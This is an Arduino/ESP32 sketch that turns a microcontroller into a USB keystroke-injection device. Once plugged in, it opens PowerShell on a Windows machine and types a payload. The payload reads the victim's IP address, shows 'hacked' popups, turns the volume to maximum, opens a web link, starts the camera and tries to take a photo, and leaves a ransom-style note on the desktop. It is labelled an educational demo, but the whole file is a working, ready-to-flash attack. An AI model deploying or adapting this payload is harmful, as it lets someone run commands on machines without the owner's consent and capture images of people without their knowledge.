#include "USB.h"
#include "USBHIDKeyboard.h"
USBHIDKeyboard Keyboard;

void typeString(const char* text) {
  Keyboard.print(text);
}

bool payloadExecuted = false;

void setup() {
  delay(5000);
  Keyboard.begin();
  USB.begin();
  delay(3000);
}

void loop() {
  if (payloadExecuted) return;
  payloadExecuted = true;

  // Open Run dialog
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(300);
  Keyboard.releaseAll();
  delay(1200);

  // Launch PowerShell
  typeString("powershell");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(5000);

  // Main PowerShell Payload
  typeString(R"raw(
# ============== EDUCATIONAL HID INJECTION DEMO ==============

$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notmatch 'Loopback' -and $_.IPAddress -notlike '169.254*'} | Select-Object -First 1).IPAddress
$wshell = New-Object -ComObject Wscript.Shell

# Popups
$wshell.Popup("Victim IP: $ip`n`nHID Keystroke Injection Demo", 5, "Cybersecurity Demo", 0)
Start-Sleep -Seconds 4
$wshell.Popup("Hacked by b3kk7 :p`n`nEducational demonstration only!", 5, "Access Gained", 0)
Start-Sleep -Seconds 4

# Max Volume
1..50 | ForEach-Object { $wshell.SendKeys([char]175); Start-Sleep -Milliseconds 50 }

# Open YouTube
Start-Process "https://www.youtube.com/watch?v=HyZMgjYKU6Y"
Start-Sleep -Seconds 5

# Open Camera + Try to take photo
Start-Process "microsoft.windows.camera:"
Start-Sleep -Seconds 4
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait(" ")   # Try to capture photo
Start-Sleep -Seconds 3
[System.Windows.Forms.SendKeys]::SendWait(" ")

# Create & Open Hacked Note
$desktop = [Environment]::GetFolderPath("Desktop")
$filePath = "$desktop\YOU_HAVE_BEEN_HACKED.txt"
"HACKED by b3kk7`n`nThis was only a demonstration.`nStay safe!" | Out-File $filePath
Start-Process $filePath

Write-Host "`nDemo Completed Successfully! (Educational Only)" -ForegroundColor Green
)raw");

  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}